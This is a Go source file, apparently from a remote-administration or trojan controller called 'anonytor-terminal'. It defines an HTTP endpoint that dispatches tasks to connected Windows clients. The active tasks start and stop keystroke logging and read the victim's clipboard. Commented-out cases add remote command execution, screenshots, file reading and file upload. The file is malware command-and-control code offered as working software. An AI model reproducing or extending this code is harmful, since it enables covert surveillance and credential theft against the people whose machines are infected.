package handlers

import (
	"anonytor-terminal/api/middlewares"
	"anonytor-terminal/controller/connection"
	"anonytor-terminal/controller/task/windows"
	"anonytor-terminal/runtime/definition"
	"github.com/gin-gonic/gin"
	"net/http"
	"time"
)

func RegisterTask(r *gin.RouterGroup) {
	r.POST("", CreateTask())
}

func CreateTask() gin.HandlerFunc {
	return func(c *gin.Context) {
		type req struct {
			ID      string                 `json:"id"`
			CmdType string                 `json:"cmdType"`
			Params  map[string]interface{} `json:"params"`
		}
		var r req
		err := c.ShouldBindJSON(&r)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"status": definition.StatusBadRequest,
			})
			return
		}
		ctrl := middlewares.GetController(c)
		switch r.CmdType {
		case "KeyboardRecordToFile":
			// {"command": "start/stop"}
			task := windows.KeyboardRecordToFileTask{Command: r.Params["command"].(string)}
			err := ctrl.ExecuteTask(r.ID, &task)
			if err != nil {
				panic(err)
			}
			timer := time.NewTimer(connection.HttpResposeTimeOut)
			select {
			case <-timer.C:
				c.JSON(http.StatusOK, gin.H{
					"status": definition.StatusNotFound,
				})
			case res := <-task.Result:
				if res == "true" {
					c.JSON(http.StatusOK, gin.H{
						"status": definition.StatusOK,
					})
				} else {
					c.JSON(http.StatusOK, gin.H{
						"status": definition.StatusNotFound,
					})
				}
			}
		case "GetClipboardText":
			task := windows.GetClipboardTextTask{}
			err := ctrl.ExecuteTask(r.ID, &task)
			if err != nil {
				panic(err)
			}
			timer := time.NewTimer(connection.HttpResposeTimeOut)
			select {
			case <-timer.C:
				c.JSON(http.StatusOK, gin.H{
					"status": definition.StatusNotFound,
				})
			case res := <-task.Result:
				c.JSON(http.StatusOK, gin.H{
					"clipboard": res,
				})
			}
			//case definition.ExecuteCommand:
			//	task := windows.ExecuteCommandTask{Command: r.Params["command"].(string)}
			//	err := ctrl.ExecuteTask(r.ID, &task)
			//	if err != nil {
			//		panic(err)
			//	}
			//case definition.KeyboardRecordListen:
			//	task := windows.KeyboardRecordListenTask{}
			//	err := ctrl.ExecuteTask(r.ID, &task)
			//	if err != nil {
			//		panic(err)
			//	}
			//case definition.GetScreenshot:
			//	task := windows.GetScreenshotTask{}
			//	err := ctrl.ExecuteTask(r.ID, &task)
			//	if err != nil {
			//		panic(err)
			//	}
			//case definition.GetFileContent:
			//	task := windows.GetFileContentTask{Path: r.Params["path"].(string)}
			//	err := ctrl.ExecuteTask(r.ID, &task)
			//	if err != nil {
			//		panic(err)
			//	}
			//case definition.UploadFile:
			//	task := windows.UploadFileTask{TargetPath: r.Params["path"].(string)}
			//	err := ctrl.ExecuteTask(r.ID, &task)
			//	if err != nil {
			//		panic(err)
			//	}
		}
	}
}
